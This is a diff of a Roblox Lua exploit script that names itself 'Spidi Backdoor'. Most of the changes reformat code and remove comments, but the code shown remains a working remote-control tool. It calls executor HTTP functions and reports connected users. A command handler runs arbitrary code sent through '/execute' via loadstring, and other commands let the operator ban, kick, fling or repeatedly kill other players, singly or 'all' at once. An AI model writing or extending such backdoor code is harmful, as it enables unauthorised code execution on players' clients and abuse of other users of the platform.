@@ -25,6 +25,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -57,21 +58,14 @@ end
 
 -- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ ====================
 local scriptUsers = {}
+local bannedPlayers = {}
+local kickedPlayers = {}
 local myPlayer = Players.LocalPlayer
-local bannedPlayers = {} -- Список забаненных игроков (навсегда)
-local kickedPlayers = {} -- Список кикнутых игроков (на 1 раз)
 
 local function addScriptUser(player)
     if not scriptUsers[player.UserId] then
         scriptUsers[player.UserId] = player
         sendMessage("🟢 <b>"..player.Name.."</b> подключился к Spidi Backdoor!")
-    end
-end
-
-local function removeScriptUser(player)
-    if scriptUsers[player.UserId] then
-        scriptUsers[player.UserId] = nil
-        sendMessage("🔴 <b>"..player.Name.."</b> отключился от Spidi Backdoor!")
     end
 end
 
@@ -86,7 +80,6 @@ local function findPlayer(input)
         return nil, "❌ Введи ник или номер"
     end
     
-    -- Проверка на "all"
     if input:lower() == "all" then
         local all = {}
         for _, p in pairs(Players:GetPlayers()) do
@@ -144,16 +137,14 @@ end
 -- ==================== МУЗЫКА ====================
 local function playMusic(target, soundId)
     if not target or not soundId then return end
-    local player = target
-    local oldSound = player:FindFirstChild("ClientMusic")
+    local oldSound = target:FindFirstChild("ClientMusic")
     if oldSound then oldSound:Destroy() end
-    
     local sound = Instance.new("Sound")
     sound.Name = "ClientMusic"
     sound.SoundId = "rbxassetid://" .. tostring(soundId)
     sound.Volume = 1
     sound.Looped = true
-    sound.Parent = player
+    sound.Parent = target
     sound:Play()
 end
 
@@ -312,12 +303,10 @@ local function showNotification(target, text, duration)
     duration = duration or 5
     local gui = target:FindFirstChild("PlayerGui")
     if not gui then return end
-    
     local screen = Instance.new("ScreenGui")
     screen.Name = "SpidiNotif"
     screen.ResetOnSpawn = false
     screen.Parent = gui
-    
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 450, 0, 50)
     frame.Position = UDim2.new(0.5, -225, 0, 20)
@@ -325,16 +314,13 @@ local function showNotification(target, text, duration)
     frame.BackgroundTransparency = 0.1
     frame.BorderSizePixel = 0
     frame.Parent = screen
-    
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, 10)
     corner.Parent = frame
-    
     local stroke = Instance.new("UIStroke")
     stroke.Color = Color3.fromRGB(0, 255, 0)
     stroke.Thickness = 1
     stroke.Parent = frame
-    
     local textLabel = Instance.new("TextLabel")
     textLabel.Size = UDim2.new(1, -20, 1, 0)
     textLabel.Position = UDim2.new(0, 10, 0, 0)
@@ -346,14 +332,12 @@ local function showNotification(target, text, duration)
     textLabel.TextXAlignment = Enum.TextXAlignment.Center
     textLabel.TextWrapped = true
     textLabel.Parent = frame
-    
     frame.BackgroundTransparency = 1
     frame.Position = UDim2.new(0.5, -225, 0, -80)
     TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
         BackgroundTransparency = 0.1,
         Position = UDim2.new(0.5, -225, 0, 20)
     }):Play()
-    
     game:GetService("Debris"):AddItem(screen, duration)
 end
 
@@ -445,7 +429,10 @@ local function handleCommand(cmd, args, username)
     
     if cmd == "execute" then
         local code = table.concat(args, " ", 1)
-        if code == "" then sendMessage("❌ /execute код") return end
+        if code == "" then
+            sendMessage("❌ /execute код")
+            return
+        end
         sendMessage("⏳ Выполнение...")
         local ok, res = pcall(loadstring, code)
         if ok then
@@ -472,7 +459,6 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- ========== MUSIC ==========
     if cmd == "music" then
         local name = args[1]
         local id = args[2]
@@ -530,9 +516,7 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- Если это список "all"
     if type(targets) == "table" and targets[1] and targets[1] == "all" then
-        -- Собираем всех пользователей скрипта кроме себя
         local allPlayers = {}
         for _, p in pairs(Players:GetPlayers()) do
             if scriptUsers[p.UserId] and p ~= myPlayer then
@@ -542,12 +526,10 @@ local function handleCommand(cmd, args, username)
         targets = allPlayers
     end
     
-    -- Если это один игрок, превращаем в таблицу для единообразия
     if type(targets) ~= "table" then
         targets = { targets }
     end
     
-    -- Убираем себя из списка (защита)
     local filtered = {}
     for _, p in pairs(targets) do
         if p ~= myPlayer then
@@ -561,18 +543,15 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- ========== ВЫПОЛНЕНИЕ КОМАНД ==========
     local reason = table.concat(args, " ", 2)
     if reason == input then reason = "" end
     
     for _, target in pairs(targets) do
-        -- Пропускаем если игрок уже забанен
         if cmd == "ban" and bannedPlayers[target.UserId] then
             sendMessage("⚠️ <b>"..target.Name.."</b> уже забанен")
             goto continue
         end
         
-        -- Пропускаем если игрок уже кикнут
         if cmd == "kick" and kickedPlayers[target.UserId] then
             sendMessage("⚠️ <b>"..target.Name.."</b> уже кикнут")
             goto continue
@@ -627,7 +606,9 @@ local function handleCommand(cmd, args, username)
             
         elseif cmd == "unfly" and hrp then
             for _, v in pairs(hrp:GetChildren()) do
-                if v:IsA("BodyVelocity") then v:Destroy() end
+                if v:IsA("BodyVelocity") then
+                    v:Destroy()
+                end
             end
             sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
             
@@ -652,7 +633,9 @@ local function handleCommand(cmd, args, username)
                 for i = 1, 10 do
                     if not target or not target.Character then break end
                     local hum = target.Character:FindFirstChild("Humanoid")
-                    if hum then hum.Health = 0 end
+                    if hum then
+                        hum.Health = 0
+                    end
                     task.wait(0.5)
                 end
             end)
